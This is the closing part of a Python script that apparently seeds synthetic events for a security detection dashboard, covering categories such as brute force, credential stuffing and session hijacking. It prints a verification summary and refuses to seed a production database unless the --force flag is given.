    print(f"Database: {settings.database_url}")
    print(f"Detection window: {settings.detection_time_window_minutes} min")
    print(f"Correlation window: {settings.correlation_time_window_hours} hours")
    print()

    # Initialize database
    await db.create_all()

    async with db.session() as session:
        try:
            # Create sources
            sources = await seed_sources(session)

            # Seed all event types
            total = 0
            total += await seed_background_traffic(session, sources)
            total += await seed_brute_force(session, sources)
            total += await seed_credential_stuffing(session, sources)
            total += await seed_enumeration(session, sources)
            total += await seed_parameter_tampering(session, sources)
            total += await seed_bot_traffic(session, sources)
            total += await seed_headless_browser(session, sources)
            total += await seed_session_hijacking(session, sources)
            total += await seed_sensitive_actions(session, sources)
            total += await seed_api_abuse(session, sources)

            print(f"\n[OK] Total events ingested: {total}")

            # Verify
            stats = await verify_results(session)

            print("\n" + "=" * 60)
            print("[OK] Seeding complete!")
            print("=" * 60)

            # Summary for dashboard verification
            print("\n[CHECK] Dashboard Verification Checklist:")
            print(f"  [OK] Events Today: {stats['total_events']}")
            print(f"  [OK] Active Alerts: {stats['total_alerts']}")
            print(f"  [OK] Open Incidents: {stats['total_incidents']}")
            print(f"  [OK] Sources: {len(stats['events_by_source'])}")
            print(f"  [OK] Detection Types Triggered: {list(stats['alerts_by_type'].keys())}")
            print(f"  [OK] MITRE Tactics: {list(stats['mitre_tactics'].keys())}")

        except Exception as e:
            print(f"\n[ERROR] Error: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)
        finally:
            await db.close()


if __name__ == "__main__":
    # Safety: never seed demo data (including a publicly known demo API key)
    # into a production database unless explicitly forced.
    if settings.environment == "production" and "--force" not in sys.argv:
        print(
            "Refusing to seed demo data with ENVIRONMENT=production. "
            "Re-run with --force if you really mean it."
        )
        sys.exit(2)
    asyncio.run(main())
